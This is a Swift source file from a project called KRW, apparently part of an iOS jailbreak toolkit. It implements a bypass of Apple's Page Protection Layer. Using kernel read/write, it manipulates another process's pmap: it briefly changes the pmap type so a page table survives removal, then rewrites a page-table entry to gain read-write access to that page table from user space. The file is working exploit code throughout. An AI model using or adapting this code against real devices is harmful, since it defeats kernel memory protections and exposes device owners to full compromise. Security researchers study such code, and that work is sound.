//
//  PPL.swift
//  KRW
//
//  Created by Linus Henze on 2023-01-14.
//  Copyright © 2023 Pinauten GmbH. All rights reserved.
//  

import Foundation

let FAKE_PHYSPAGE_TO_MAP: UInt64 = 0x13370000
public let PPL_MAP_ADDR:  UInt64 = 0x2000000 // This is essentially guaranteed to be unused, minimum address is usually 0x100000000

public extension KRW {
    static func pplwrite(virt: UInt64, data: Data) throws {
        try PPLRW.write(virt: virt, data: data)
    }
    
    static func pplwrite(phys: UInt64, data: Data) throws {
        PPLRW.write(phys: phys, data: data)
    }
    
    static func pmap_lv2(_ pmap: UInt64, _ virt: UInt64) throws -> UInt64 {
        let ttep = try r64(virt: pmap + 0x8)
        let table1Off = (virt >> 36) & 0x7
        
        let table1Entry = try r64(phys: ttep + (8 * table1Off))
        guard (table1Entry & 0x3) == 3 else {
            return 0
        }
        
        let table2 = table1Entry & 0xFFFFFFFFC000
        let table2Off = (virt >> 25) & 0x7FF
        let table2Entry = try r64(phys: table2 + (8 * table2Off))
        
        return table2Entry
    }
    
    static func initPPLBypass(inProcess pid: pid_t) throws -> Bool {
        guard let pmap = try Proc(pid: pid)?.task?.vmMap?.pmap else {
            log("Failed to get other process pmap!")
            return false
        }
        
        let kr = pmap_enter_options_addr(pmap.address, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR)
        guard kr == KERN_SUCCESS else {
            log("pmap_enter_options_addr failed!")
            return false
        }
        
        guard let origType = pmap.type else {
            pmap_remove(pmap.address, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000)
            log("pmap_enter_options_addr failed!")
            return false
        }
        
        // Temporarily change pmap type to nested
        pmap.type = 3
                        
        // Remove mapping (table will not be removed because we changed the pmap type)
        pmap_remove(pmap.address, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
                        
        // Change type back
        pmap.type = origType
        
        // Change the mapping to map the underlying page table
        let table2Entry = try pmap_lv2(pmap.address, PPL_MAP_ADDR)
        guard (table2Entry & 0x3) == 0x3 else {
            log("table2Entry has wrong type!")
            return false
        }
        
        let table3 = table2Entry & 0xFFFFFFFFC000
        let pte: UInt64 = table3 | perm_to_pte(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY
        
        try? KRW.pplwrite(phys: table3, data: Data(fromObject: pte))
        
        return true
    }
}
